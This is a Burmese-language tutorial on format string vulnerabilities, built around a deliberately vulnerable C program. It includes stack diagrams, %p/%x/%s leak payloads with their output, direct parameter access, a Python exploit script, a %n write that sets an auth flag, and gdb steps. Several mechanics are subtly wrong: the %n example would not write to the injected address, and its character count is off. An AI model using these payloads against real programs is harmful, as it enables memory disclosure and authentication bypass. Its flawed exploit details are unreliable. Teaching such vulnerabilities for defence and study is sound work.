## **Stack Frame Examples နဲ့ %p, %x, %s ကွာခြားချက်များ**

### **1. Stack Memory Layout Example:**
```

High Address
+------------------+
|    ...           |
+------------------+
|  Return Address  |  <- 0xbffff1bc
+------------------+
|  Saved EBP       |  <- 0xbffff1b8
+------------------+
|  Local Var 1     |  <- 0xbffff1b4
+------------------+
|  Local Var 2     |  <- 0xbffff1b0
+------------------+
|  Format String   |  <- 0xbffff1ac
+------------------+
|  char buffer[64] |  <- 0xbffff16c
+------------------+
|  Canary Value    |  <- 0xbffff168
+------------------+
Low Address
```

### **2. Vulnerable Code Example:**
```c
#include <stdio.h>

void vulnerable_function(char *input) {
    char buffer[64];
    char *secret = "MY_SECRET_PASSWORD";
    int auth_flag = 0;
    
    // Vulnerability here!
    printf(input);  // User controls format string
    
    if(auth_flag) {
        printf("Access granted!\n");
    }
}

int main() {
    char user_input[100];
    fgets(user_input, sizeof(user_input), stdin);
    vulnerable_function(user_input);
    return 0;
}
```

### **3. Stack Frame အတွင်းမှာ ဘယ်လိုသိမ်းထားလဲ:**
```
Stack Frame of vulnerable_function():
+----------------------+-----------------+-----------------------+
|      Address         |     Value       |    Variable Name      |
+----------------------+-----------------+-----------------------+
| 0xbffff1bc           | 0x08048456     | Return Address        |
| 0xbffff1b8           | 0xbffff1e8     | Saved EBP             |
| 0xbffff1b4           | 0x00000000     | auth_flag = 0         |
| 0xbffff1b0           | 0x0804a008     | *secret pointer       |
| 0xbffff1ac           | 0xbffff200     | *input pointer        |
| 0xbffff1a8           | 0x00000000     | (padding)             |
| ... buffer space ... | ...            | buffer[64]            |
| 0xbffff16c           | 0x00000000     | buffer[0]             |
+----------------------+-----------------+-----------------------+

Memory at 0x0804a008 (where secret points):
0x0804a008: 'M' 'Y' '_' 'S' 'E' 'C' 'R' 'E' 'T' '_' ... '\0'
```

### **4. %p သုံးတဲ့ဥပမာ:**
```bash
# User Input:
AAAA%p.%p.%p.%p.%p.%p

# Output:
AAAA0xbffff200.0x00000000.0x0804a008.0x00000000.0xbffff1e8.0x08048456
     ↑              ↑          ↑           ↑          ↑          ↑
   input ptr    auth_flag   secret ptr  (padding)  saved EBP  return addr
   (1st %p)     (2nd %p)     (3rd %p)    (4th %p)   (5th %p)   (6th %p)

# ဘာတွေ့ရလဲ:
- 0x0804a008 က secret string ရဲ့ address
- 0xbffff1e8 က main function ရဲ့ stack frame
- 0x08048456 က return address
```

### **5. %x သုံးတဲ့ဥပမာ:**
```bash
# User Input:
%08x.%08x.%08x.%08x.%08x

# Output:
bffff200.00000000.0804a008.00000000.bffff1e8
     ↑         ↑       ↑        ↑        ↑
   input    auth    secret   padding   saved EBP
   
# %p vs %x ကွာခြားချက်:
- %p: 0xbffff200 (with 0x prefix)
- %x: bffff200  (without 0x prefix, depends on format)
```

### **6. %s သုံးတဲ့ဥပမာ (Arbitrary Read):**
```bash
# Step 1: ရှာရမယ့် address ကိုသိရန် %p သုံးပြီးရှာ
Input: AAAA%p.%p.%p
Output: AAAA0xbffff200.0x00000000.0x0804a008
                      ↑
                ဒီ address က secret ရဲ့ address: 0x0804a008

# Step 2: %s နဲ့ဖတ်ရန်
# Memory ထဲကို address ထည့်ပေးရတယ် (little-endian ဖြစ်တယ်)
Input: \x08\xa0\x04\x08%s
       (0x0804a008 in little-endian: 08 a0 04 08)

Output: MY_SECRET_PASSWORD
```

### **7. Stack ပေါ်မှာ format string exploit ဘယ်လိုအလုပ်လုပ်လဲ:**
```
Before printf() called:
Stack pointer (ESP) → +----------------------+
                      | address of input     | 0xbffff200
                      +----------------------+
                      | format string addr   | 0xbffff1ac
                      +----------------------+

printf() ခေါ်တဲ့အခါ:
- ပထမဆုံး argument က format string address
- ကျန်တဲ့ arguments တွေက stack ထဲက နောက်ထပ် values တွေ
```

### **8. Direct Parameter Access နဲ့လုပ်တဲ့ဥပမာ:**
```c
// Stack ပေါ်မှာ:
// Position:  1       2       3       4       5       6
// Values: 0xbffff200 0x00 0x0804a008 0x00 0xbffff1e8 0x08048456

# Input: %3$p    (3rd parameter ကိုဖတ်)
# Output: 0x0804a008  (secret address)

# Input: %3$s    (3rd parameter ကို string အဖြစ်ဖတ်)
# Output: MY_SECRET_PASSWORD

# Input: %5$p    (5th parameter ကိုဖတ်)
# Output: 0xbffff1e8  (saved EBP)

# Input: %6$p    (6th parameter ကိုဖတ်)
# Output: 0x08048456  (return address)
```

### **9. Complete Exploit Example:**
```python
#!/usr/bin/env python3
import struct
import sys

# Step 1: Find secret address
payload1 = b"AAAA%p.%p.%p.%p.%p"
print("[*] Finding addresses...")
# Assume output: AAAA0xbffff200.0x00000000.0x0804a008.0x00000000.0xbffff1e8
# Secret is at 3rd position: 0x0804a008

# Step 2: Read secret using %s
secret_addr = 0x0804a008
payload2 = struct.pack("<I", secret_addr)  # Little-endian
payload2 += b"%3$s"  # Read 3rd parameter as string

print("[*] Reading secret...")
# Output will be: [garbage bytes]MY_SECRET_PASSWORD
```

### **10. Stack ပေါ်မှာ write လုပ်တဲ့ဥပမာ (auth_flag ကို overwrite):**
```
# auth_flag ရဲ့ address ကို ရှာရန်
# သူက 2nd parameter (0x00000000 ဆိုတဲ့နေရာ)

# %n သုံးပြီး write လုပ်မယ်
# %n က ရေးပြီးသား character အရေအတွက်ကို ပေးထားတဲ့ address မှာ ရေးပေးတယ်

Input: \xb4\xf1\xff\xbf%08x%n
       ↑                   ↑
 auth_flag address      write count to that address
 (0xbffff1b4)

# Result: auth_flag = 8 (ဘာလို့လဲဆို %08x က 8 characters ထုတ်တယ်)
# ဒါဆို if(auth_flag) က true ဖြစ်သွားပြီး "Access granted!" ပေါ်မယ်
```

### **လက်တွေ့လေ့လာရန်:**
```bash
# gdb ထဲမှာ စမ်းကြည့်ချင်ရင်
$ gdb ./vulnerable_program
(gdb) break printf
(gdb) run < <(python -c 'print("AAAA%p.%p.%p")')
(gdb) x/20wx $esp  # Stack ကို hexadecimal ကြည့်မယ်
(gdb) continue     # Output ကိုကြည့်မယ်
```

**သတိထားရန်**: Stack layout က compiler, architecture, နဲ့ OS အပေါ်မူတည်ပြီး ကွဲပြားနိုင်ပါတယ်။ ဒါကြောင့် ကိုယ့်စက်ပေါ်မှာ စမ်းသပ်ကြည့်ရင် address တွေ ကွဲပြားနိုင်ပါတယ်။